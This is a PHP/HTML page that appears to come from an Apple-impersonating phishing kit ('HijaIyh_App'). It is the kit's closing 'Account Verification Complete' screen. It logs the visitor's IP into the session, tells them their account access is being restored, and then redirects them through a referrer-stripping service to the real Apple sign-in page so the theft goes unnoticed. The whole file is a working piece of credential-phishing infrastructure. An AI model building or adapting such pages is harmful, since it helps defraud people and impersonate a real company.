<?php
$core->create_session(['done' => $core->userIP() ]);

?>
<!DOCTYPE html>
<html>
  <head>

    <meta charset="utf-8">
      <meta http-equiv="refresh" content="4;url=https://href.li/?https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&accNameLocked=false&language=US-EN&path=/signin/?referrer=/account/manage&Env=PROD">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/modal.css">
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/bootstrap.min.css">
    <link rel="icon" href="./HijaIyh_App/assets/img/favicon.ico" type="image/x-icon" />
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="shortcut icon" sizes="196x196" href="./HijaIyh_App/assets/img/favicon.ico">
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.js"></script>
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.validate.min.js"></script>
    
  </head>
  <body>
    <!--e06ee9b718d16b4b468603e41f61f07b-->
 
		
        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="./HijaIyh_App/assets/css/desktop.css">
                <!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><?=$core->translate('Confirm your information',$lang);?></title><style>

.error{
  background-color: #fefdd2;
  
}

.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.required:focus{
    border-width: 1px;
    border-color: #0088cc;
       -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

.inox{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.inox:focus{
    border-width: 1px;
    border-color: #0088cc;
    -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

#bottom_m_login{
  background-color: #000;
  position: absolute;
  opacity: 0.7;
  width: 100%;
  height: 50px;
  z-index: 55;
}

#bottom_m1_login{
  background-color: #fff;
  position: absolute;
  width: 100%;
  margin-top:50px;
  height: 40px;
  z-index: 55;
}
#i1{
  background-image: url(./HijaIyh_App/assets/img/i1.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 12px;
  left: 20px;
  top: 20px;
  z-index: 999;
  position: absolute;
}
#i2{
  background-image: url(./HijaIyh_App/assets/img/i2.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 29px;
  left: 50%;
  margin-left: -17.5px;
  top: 10px;
  z-index: 999;
  position: absolute;
}
#i3{
  background-image: url(./HijaIyh_App/assets/img/i3.png);
  background-repeat: no-repeat;
  width: 20px;
  height: 26px;
  right: 20px;
  top: 10px;
  z-index: 999;
  position: absolute;
}


#container_m_login{
    position: absolute;
    top: 0px;
    left: 50%;
  width: 330px;
  margin-left: -165px;
}
#xheader_m_login{
    width: 100%;
    height: 400px;
    top:0px;
}

.error{
  background-color: #fefdd2;
}
#sub_navbar_m_login{
    width: 100%;
    height: 61px;
    top: 44px;
    left: 0px;
    z-index: 3;
    position: absolute;
}



</style>


    </head>
<body>
<div id="bottom_m_login"></div>
    <div id="i1"></div>
    <div id="i2"></div>
    <div id="i3"></div>
    <div id="bottom_m1_login"></div>
<div style="
    margin: auto;
    position: relative;
    margin-top: 79px;
    margin-left: 0px;
    height: 530px;
  ">

      <font class="xFont3" style="top:40px;left:100px;">
                <img id="gambarmobile" width="150" src="./HijaIyh_App/assets/img/done.png">
            </font>
        <font class="xFont3" style="top:170px;left:60px;">
                <b><?=$core->translate('Account Verification Complete',$lang);?></b>
            </font>
        <font class="xFont2" style="text-align:center;top:210px;left:70px;width:210px;">
                <?=$core->translate('Please wait while we restore your account access...',$lang);?>            </font>
     

        </form>
        </div>                                
                </div>
        </div>
      <body>
</html>
